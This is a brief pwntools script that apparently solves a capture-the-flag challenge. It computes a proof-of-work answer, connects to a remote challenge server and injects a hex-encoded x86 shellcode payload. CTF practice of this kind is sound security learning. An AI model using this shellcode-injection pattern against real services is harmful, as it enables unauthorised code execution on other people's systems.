#!/usr/bin/env python3
from pwn import *
import base64, re

def solve_pwn_red_pow(c):
    p = c.split('.')
    d = int.from_bytes(base64.b64decode(p[1]), 'big')
    cb = base64.b64decode(p[2])
    m = (1 << 1279) - 1
    e = 1 << 1277
    x = int.from_bytes(cb, 'big')
    for _ in range(d):
        x = pow(x, e, m)
        x ^= 1
    return 's.' + base64.b64encode(x.to_bytes((x.bit_length() + 7) // 8, 'big')).decode()

payload = "b84170330180008d40800040684f0a0a0a684c4c454889e1b804000000bb01000000ba05000000e910000000404840484048404840484048404840484040b801000000bb00000000cc909090"

io = remote('amt.rs', 57207)
io.sendline(solve_pwn_red_pow(re.search(r's\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+', io.recvuntil(b'solution: ').decode()).group(0)).encode())
io.recvuntil(b'shellcode: ')
io.sendline(payload.encode())
log.info("Sent, receiving...")
print(io.recvall(timeout=5).decode(errors='ignore'))
io.close()
